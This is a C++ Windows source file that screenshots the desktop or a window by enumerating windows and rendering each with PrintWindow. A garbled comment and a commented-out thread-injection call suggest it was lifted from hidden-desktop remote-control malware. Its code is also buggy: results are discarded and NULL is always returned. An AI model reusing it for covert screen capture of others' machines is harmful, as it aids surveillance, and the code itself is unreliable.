#include "pch.h"
#include "Screen.h"
#include <Windows.h>
#include <stdio.h>
#include <assert.h>
#include <atltypes.h>
#include "bmp2jpg.h"
#include <iostream>

#include <vector>

using namespace std;
HDC hCompDC, hTmpCompDC, hRealWndCompDC;
DWORD dwPID;
#define init_DC(x)    HDC x##DC=GetDC(0);\
                      x##CompDC=CreateCompatibleDC(hDC);\
                      HBITMAP x##Bitmap=CreateCompatibleBitmap(x##DC,dwWidth,dwHeight);\
                      SelectObject(x##CompDC,x##Bitmap);

#define destroy_DC(x) DeleteDC(x##CompDC);\
                      DeleteObject(x##Bitmap);\
                      DeleteDC(x##DC);
struct WND_INFO
{
	RECT rcWnd;
	DWORD dwWidth;
	DWORD dwHeight;
	bool bScrollBars;
	RECT rcHScroll;
	RECT rcVScroll;
};
bool bXP;
void DrawWindow(HWND hWnd, HDC hDCTo, HDC hDCFrom)
{
	if (IsWindowVisible(hWnd))
	{
		LONG dwStyle = GetClassLongPtr(hWnd, GCL_STYLE);
		if ((!(dwStyle & CS_PARENTDC)) && /*(!(dwStyle & CS_OWNDC)) && */(!(dwStyle & CS_CLASSDC)))
		{
			if (bXP)
			{
				dwStyle = GetWindowLongPtr(hWnd, GWL_EXSTYLE);
				if (!(dwStyle & WS_EX_LAYERED))
				{
					//SetWindowLongPtr(hWnd,GWL_EXSTYLE,dwStyle | WS_EX_LAYERED);
					//SetLayeredWindowAttributes(hWnd,0xFFFF,255,LWA_ALPHA);
				}
				SendMessage(hWnd, WM_NCACTIVATE, true, NULL);
			}
			RECT rect;
			GetWindowRect(hWnd, &rect);
			PrintWindow(hWnd, hDCFrom, NULL);
			BitBlt(hDCTo, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, hDCFrom, 0, 0, SRCCOPY);

			//StretchBlt(hDCTo, rect.left, rect.top, 1200,600, hDCFrom,0,0, rect.right - rect.left, rect.bottom - rect.top, SRCCOPY);
		}
	}
	return;
}
void DrawChildWindow(HWND hWnd, HDC hDCTo, HDC hDCFrom, WND_INFO *lpWndInfo)
{
	if (IsWindowVisible(hWnd))
	{
		LONG dwStyle = GetClassLongPtr(hWnd, GCL_STYLE);
		if ((!(dwStyle & CS_PARENTDC)) && /*(!(dwStyle & CS_OWNDC)) && */(!(dwStyle & CS_CLASSDC)))
		{
			RECT rect;
			GetWindowRect(hWnd, &rect);
			if ((rect.right > lpWndInfo->rcWnd.left) && (rect.left < lpWndInfo->rcWnd.right) && (rect.bottom > lpWndInfo->rcWnd.top) && (rect.top < lpWndInfo->rcWnd.bottom))
			{
				PrintWindow(hWnd, hDCFrom, NULL);
				int dwX = 0, dwY = 0;
				if (rect.bottom > lpWndInfo->rcWnd.bottom)
				{
					rect.bottom = lpWndInfo->rcWnd.bottom - 2;
					if (lpWndInfo->bScrollBars)
						rect.bottom -= lpWndInfo->rcHScroll.bottom - lpWndInfo->rcHScroll.top;
				}
				if (rect.top < lpWndInfo->rcWnd.top)
				{
					dwY = lpWndInfo->rcWnd.top - rect.top + 2;
					rect.top = lpWndInfo->rcWnd.top + 2;
				}
				if (rect.right > lpWndInfo->rcWnd.right)
				{
					rect.right = lpWndInfo->rcWnd.right - 2;
					if (lpWndInfo->bScrollBars)
						rect.right -= lpWndInfo->rcVScroll.right - lpWndInfo->rcVScroll.left;
				}
				if (rect.left < lpWndInfo->rcWnd.left)
				{
					dwX = lpWndInfo->rcWnd.left - rect.left + 2;
					rect.left = lpWndInfo->rcWnd.left + 2;
				}
				BitBlt(hDCTo, rect.left, rect.top, rect.right - rect.left, rect.bottom - rect.top, hDCFrom, dwX, dwY, SRCCOPY);

				//StretchBlt(hDCTo, rect.left, rect.top, 1200,600, hDCFrom, dwX, dwY, rect.right - rect.left, rect.bottom - rect.top, SRCCOPY);
			}
		}
	}
	return;
}

void FillRectInfo(HWND hWnd, WND_INFO *lpWndInfo, WND_INFO *lpParentWndInfo)
{
	GetWindowRect(hWnd, &lpWndInfo->rcWnd);
	lpWndInfo->dwWidth = lpWndInfo->rcWnd.right - lpWndInfo->rcWnd.left;
	lpWndInfo->dwHeight = lpWndInfo->rcWnd.bottom - lpWndInfo->rcWnd.top;

	LONG dwStyle;
	dwStyle = GetWindowLongPtr(hWnd, GWL_STYLE);
	if ((dwStyle & WS_VSCROLL) || (dwStyle & WS_HSCROLL))
	{
		SCROLLBARINFO sbiInfo;
		sbiInfo.cbSize = sizeof(sbiInfo);
		if (GetScrollBarInfo(hWnd, OBJID_HSCROLL, &sbiInfo))
		{
			try {
				lpWndInfo->bScrollBars = true;
				if(&sbiInfo.rcScrollBar!=0&& &sbiInfo.rcScrollBar!=NULL)
					if (memmove_s(&lpWndInfo->rcHScroll, sizeof(RECT), &sbiInfo.rcScrollBar, sizeof(RECT)) != 0);
			}
			catch(exception e){}
		}
		if (GetScrollBarInfo(hWnd, OBJID_VSCROLL, &sbiInfo))
		{
			try {
			lpWndInfo->bScrollBars = true;
			if (&sbiInfo.rcScrollBar != 0 && &sbiInfo.rcScrollBar != NULL)
				if (memmove_s(&lpWndInfo->rcVScroll, sizeof(RECT),&sbiInfo.rcScrollBar, sizeof(RECT)) != 0);
			}
			catch (exception e) {}
		}
	}

	if (lpParentWndInfo)
	{
		if (lpWndInfo->rcWnd.bottom > lpParentWndInfo->rcWnd.bottom)
		{
			lpWndInfo->rcWnd.bottom = lpParentWndInfo->rcWnd.bottom;
			if (lpParentWndInfo->bScrollBars)
				lpWndInfo->rcWnd.bottom -= lpParentWndInfo->rcHScroll.bottom - lpParentWndInfo->rcHScroll.top;
		}
		if (lpWndInfo->rcWnd.top < lpParentWndInfo->rcWnd.top)
			lpWndInfo->rcWnd.top = lpParentWndInfo->rcWnd.top;
		if (lpWndInfo->rcWnd.right > lpParentWndInfo->rcWnd.right)
		{
			lpWndInfo->rcWnd.right = lpParentWndInfo->rcWnd.right;
			if (lpParentWndInfo->bScrollBars)
				lpWndInfo->rcWnd.right -= lpParentWndInfo->rcVScroll.right - lpParentWndInfo->rcVScroll.left;
		}
		if (lpWndInfo->rcWnd.left < lpParentWndInfo->rcWnd.left)
			lpWndInfo->rcWnd.left = lpParentWndInfo->rcWnd.left;
	}
	return;
}

#ifdef DBG
HBITMAP hBitmap;
DWORD dwWidth, dwHeight;
#endif
void EnumChilds(HWND hWnd, WND_INFO *lpWndInfo)
{
	if (hWnd)
	{
		do
		{
			DrawChildWindow(hWnd, hCompDC, hTmpCompDC, lpWndInfo);
			WND_INFO wiWndInfo = { 0 };
			FillRectInfo(hWnd, &wiWndInfo, lpWndInfo);

#ifdef DBG
			SaveToPNG(hBitmap, dwWidth, dwHeight);
#endif

			EnumChilds(GetWindow(GetWindow(hWnd, GW_CHILD), GW_HWNDLAST), &wiWndInfo);
		} while (hWnd = GetWindow(hWnd, GW_HWNDPREV));
	}
	return;
}

// TODO (Ãîñòü#1#): ïåðåõâàò â ñêðûòîì áðàóçåðå, ïîñûë ñîîáùåíèé êàê â âíö
/* forward declarations */
void EnumWnds(HWND hWnd)
{
	if (hWnd)
	{
		do
		{
			if (!IsIconic(hWnd))
			{
				/*if (bXP)
					InjectWnd((LPTHREAD_START_ROUTINE)RemoteThread,hWnd);*/
				DrawWindow(hWnd, hCompDC, hTmpCompDC);
				if (bXP)
				{
					WND_INFO wiWndInfo = { 0 };
					FillRectInfo(hWnd, &wiWndInfo, NULL);
					EnumChilds(GetWindow(GetWindow(hWnd, GW_CHILD), GW_HWNDLAST), &wiWndInfo);
				}
			}
		} while (hWnd = GetWindow(hWnd, GW_HWNDPREV));
	}
	return;
}
const char* MakeScreenShot(HWND hWnd, HDC hDC_res, DWORD* W, DWORD* H)
{
	HWND hDesk = GetDesktopWindow();
	if (hWnd == 0) hWnd = hDesk;
	RECT rect;
	GetWindowRect(hDesk, &rect);

#ifdef DBG
	dwWidth = rect.right - rect.left;
	dwHeight = rect.bottom - rect.top;

	HDC hDC = GetDC(0);
	hCompDC = CreateCompatibleDC(hDC);
	hBitmap = CreateCompatibleBitmap(hDC, dwWidth, dwHeight);
	SelectObject(hCompDC, hBitmap);
#else
	DWORD dwWidth = rect.right - rect.left,
		dwHeight = rect.bottom - rect.top;

	init_DC(h);
#endif
	init_DC(hTmp);
	init_DC(hRealWnd);

	DrawWindow(hWnd, hCompDC, hTmpCompDC);
	EnumWnds(GetWindow(GetWindow(hWnd, GW_CHILD), GW_HWNDLAST));
	const char* imeg;
	if (hDesk != hWnd)
	{
		GetWindowRect(hWnd, &rect);
		dwWidth = rect.right - rect.left;
		dwHeight = rect.bottom - rect.top;
		*W = dwWidth;
		*H = dwHeight;

		HDC hWndCompDC;
		init_DC(hWnd);
		//BitBlt(hDC_res, 0, 0, dwWidth, dwHeight, hCompDC, rect.left, rect.top, SRCCOPY);

		StretchBlt(hDC_res, 0, 0, 1200, 600, hCompDC, rect.left, rect.top, dwWidth, dwHeight, SRCCOPY);
		//BitBlt(hWndCompDC, 0, 0, dwWidth, dwHeight, hCompDC, rect.left, rect.top, SRCCOPY);

		StretchBlt(hWndCompDC, 0, 0, 1200, 600, hCompDC, rect.left, rect.top, dwWidth, dwHeight, SRCCOPY);
		imeg = SaveFile(hWndBitmap);


		destroy_DC(hWnd);
	}
	else
	{
		*W = dwWidth;
		*H = dwHeight;
		//BitBlt(hDC_res, 0, 0, dwWidth, dwHeight, hCompDC, rect.left, rect.top, SRCCOPY);
		StretchBlt(hDC_res, 0, 0, 1200, 600, hCompDC, rect.left, rect.top, dwWidth, dwHeight, SRCCOPY);
		imeg = SaveFile(hBitmap);
	}

	destroy_DC(h);
	destroy_DC(hTmp);
	destroy_DC(hRealWnd);
	return NULL;
}


const char* ScreenShot(HWND hwnd)
{

	DWORD dwPID;
	GetWindowThreadProcessId(hwnd, &dwPID);
	CHAR lpWinName[MAX_PATH];
	CHAR buf2[MAX_PATH];

	GetWindowTextA(hwnd, (LPSTR)lpWinName, sizeof(buf2));
	if (strlen(lpWinName))
		printf("%s%s", "\n", lpWinName);


	HDC wndDc = GetWindowDC(hwnd);

	HDC hDCMem = CreateCompatibleDC(wndDc);
	RECT rect;
	GetWindowRect(hwnd, &rect);
	DWORD dwWidth = rect.right - rect.left,
		dwHeight = rect.bottom - rect.top;
	const char* imeg = MakeScreenShot(hwnd, hDCMem, &dwWidth, &dwHeight);
	return NULL;
}